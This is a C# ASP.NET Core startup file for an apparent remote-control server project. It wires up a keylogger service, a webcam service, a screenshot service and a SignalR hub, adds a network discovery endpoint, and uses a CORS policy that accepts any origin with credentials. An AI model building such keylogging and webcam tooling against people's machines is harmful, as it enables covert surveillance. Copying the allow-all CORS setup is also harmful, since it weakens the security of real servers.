using server_os.Hubs;
using server_os.Services;

var builder = WebApplication.CreateBuilder(args);
builder.Environment.WebRootPath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot");
// --- PHẦN 1: ĐĂNG KÝ DỊCH VỤ ---
builder.Services.AddControllers();
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();
builder.Services.AddSingleton<WebcamService>();
// A. Đăng ký SignalR (WebSocket)
builder.Services.AddSignalR();

// B. Đăng ký 2 Service mà chúng ta vừa tạo
builder.Services.AddSingleton<KeyloggerService>();   // Keylogger cần sống mãi để ghi log
builder.Services.AddTransient<SystemActionService>(); // Mấy cái chụp ảnh thì dùng xong hủy cũng được

// --- SỬA ĐOẠN CORS NÀY ---
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowReact", policy =>
    {
        policy.SetIsOriginAllowed(origin => true) // Cho phép MỌI nguồn (localhost, IP LAN,...)
              .AllowAnyHeader()
              .AllowAnyMethod()
              .AllowCredentials(); // QUAN TRỌNG: SignalR bắt buộc phải có cái này khi dùng React
    });
});

var app = builder.Build();

// --- PHẦN 2: CHẠY ỨNG DỤNG ---
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseCors("AllowReact"); // Kích hoạt CORS
// --- THÊM 2 DÒNG NÀY ĐỂ HIỆN GIAO DIỆN SERVER ---
app.UseDefaultFiles(); // Tự động tìm file index.html
app.UseStaticFiles();  // Cho phép chạy file html/css/js
// ------------------------------------------------
app.MapControllers();
app.MapHub<SystemHub>("/systemHub"); // Mở đường dây kết nối WebSocket tại địa chỉ /systemHub
// --- THÊM ĐOẠN NÀY: API để Client dò tìm ---
app.MapGet("/api/discovery", () =>
{
    return Results.Ok(new { message = "REMOTE_SERVER_HERE", machine = Environment.MachineName });
});
// -------------------------------------------
app.Run();